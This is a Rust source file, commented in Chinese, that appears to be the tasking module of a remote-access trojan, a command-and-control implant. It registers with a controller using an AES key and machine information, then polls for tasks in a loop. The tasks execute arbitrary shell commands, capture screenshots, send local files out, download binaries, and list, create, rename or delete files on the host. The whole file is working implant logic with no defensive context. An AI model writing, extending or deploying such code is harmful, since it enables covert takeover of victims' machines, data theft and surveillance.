use std::{error::Error, process::exit, thread, time::Duration};

use crate::core::{common::{CMD_EXEC, CREATE_DIR, LIST_DIR, LIST_DISK, REMOVE, RENAME, SUCCESS}, util::{DeviceUtil, FSUtil}};

use super::{common::{config::Config, network_type::ConnectType, CAPTURE, DOWNLOAD, SLEEP, UPLOAD}, model::{Task, Tasks}, util::{NetWork, SysUtil}};

pub mod http_api;
pub mod tcp_api;
pub mod udp_api;

/**
 * api： 必须要实现Connectable特性
 */
pub struct AdapterChannel {
    pub api: Box<dyn API>,
    pub network: NetWork,
}

pub struct HttpAPI;
// pub struct TcpAPI;
pub struct UdpAPI;

/**
 * @descript 适配器连接器
 * 所有的处理逻辑放在这里，具体的实现代码在各个实现了trait的结构体中
 */
impl AdapterChannel {

    /**
     * @descript 发送上线信息主要做了以下几件事
     * 先获取aes的加密密钥
     * 然后通过该密钥将机器信息加密发送到server
     * 服务器会返回该机器的休眠等待时间、token等配置信息
     */
    pub fn start(&mut self) -> Result<(), Box<dyn Error>> {
        let key = self.api.get_aes_key(&self.network.config)?;
        self.network.config.key = key;
        // println!("[debug]:aes-key=>{:?}", self.network.config.key);
        let (token, time) = self.api.send_online_information(&self.network)?;
        self.network.config.token = token;
        self.network.config.time = time;
        // println!("{:?}", self.network.config);
        Ok(())
    }

    /**
     * @descript 真正运行执行的代码
     * 先获取任务队列
     * 然后给每个队列新建一个任务去执行
     * 获取结果或错误信息
     */
    pub fn work(&mut self) {
        loop {
            match self.api.get_tasklist(&self.network) {
                Ok(tasks) => {
                    for task in tasks {
                        // print!("{:?}", task);
                        match task.action {
                            DOWNLOAD => match self.api.download_binary(&self.network, &task.id, task.data){
                                Ok(_) => self.api.send_execution_result(&self.network, &task.id, SUCCESS),
                                Err(err) => self.api.send_execution_result(&self.network, &task.id, &err.to_string()),
                            },
                            CAPTURE => match DeviceUtil::screen_shot() {
                                Ok(binary) => self.api.upload_binary(&self.network, &task.id, binary),
                                Err(err) => self.api.send_execution_result(&self.network, &task.id, &err.to_string()),
                            }
                            UPLOAD => match FSUtil::upload(&task.data) {
                                Ok(binary) => self.api.upload_binary(&self.network, &task.id, binary),
                                Err(err) => self.api.send_execution_result(&self.network, &task.id, &err.to_string()),
                            },
                            SLEEP => match task.data.parse::<u64>() {
                                Ok(time) => {
                                    self.network.config.time = time;
                                    self.api.send_execution_result(&self.network, &task.id, SUCCESS)
                                },
                                Err(err) => self.api.send_execution_result(&self.network, &task.id, &err.to_string()),
                            },
                            _ => match Self::handle_task(&task) {
                                Ok(data) => self.api.send_execution_result(&self.network, &task.id, &data),
                                Err(err) => self.api.send_execution_result(&self.network, &task.id, &err.to_string()),
                            }
                        }
                    }
                    thread::sleep(Duration::from_secs(self.network.config.time));
                    // print!("sleepTime:{:?}", self.network.config.time)
                },
                Err(_) => exit(0),
            }
        }
    }

    /**
     * 处理任务
     */
    fn handle_task(task: &Task) -> Result<String, Box<dyn std::error::Error>> {
        // println!("task: {:?}", task);
        match task.action {
            CMD_EXEC => SysUtil::run(&task.data),
            LIST_DISK => FSUtil::list_disk(),
            LIST_DIR => FSUtil::dir(&task.data),
            CREATE_DIR => FSUtil::create_dir(&task.data),
            REMOVE => FSUtil::remove(&task.data),
            RENAME => FSUtil::rename(&task.data),
            _ => Ok(String::new())
        }
    }

}

/**
 * @descript 初始化通信管道
 */
pub fn init_channel(connect_type: ConnectType, network: NetWork) -> Result<AdapterChannel, Box<dyn Error>> {
    let api: Box<dyn API> = match connect_type {
        // ConnectType::TCP => Box::new(TcpAPI),
        ConnectType::UDP => Box::new(UdpAPI),
        ConnectType::HTTP => Box::new(HttpAPI),
        ConnectType::CLOSE => exit(0)
    };
    // 管道适配器初始化并启动
    let adapter_channel = AdapterChannel { api, network };
    Ok(adapter_channel)
}

/**
 * @descript api接口特性
 */
pub trait API{

    /**
     * @descript 获取加密通信的aes密钥
     * @param use_https 是否使用https
     * @param host 主机地址ip或域名
     * @return aes密钥
     */
    fn get_aes_key(&self, config: &Config) -> Result<String, Box<dyn Error>>;

    /**
     * @descript 发送机器自己的信息
     * @param network 封装的网络工具类
     * @return 机器token和休眠时间
     */
    fn send_online_information(&self, network: &NetWork) -> Result<(String, u64), Box<dyn Error>>;

    /**
     * @descript 获取机器被下发的任务列表
     * @param network 封装的网络工具类
     * @return 任务列表
     */
    fn get_tasklist(&self, network: &NetWork) -> Result<Tasks, Box<dyn Error>>;

    /**
     * @descript 发送任务执行后的结果
     * @param network 封装的网络工具类
     * @param id 任务id
     * @param data 执行结果数据
     */
    fn send_execution_result(&self, network: &NetWork, id: &str, data: &str);

    /**
     * @descript 发送任务执行后的结果
     * @param network 封装的网络工具类
     * @param id 任务id
     * @param data 上传的文件二进制数据
     */
    fn upload_binary(&self, network: &NetWork, id: &str, data: Vec<u8>);

    /**
     * @descript 下载控制端上传的文件
     * @param network 封装的网络工具类
     * @param id 任务id
     */
    fn download_binary(&self, network: &NetWork, id: &str, path: String) -> Result<(), Box<dyn Error>>;

}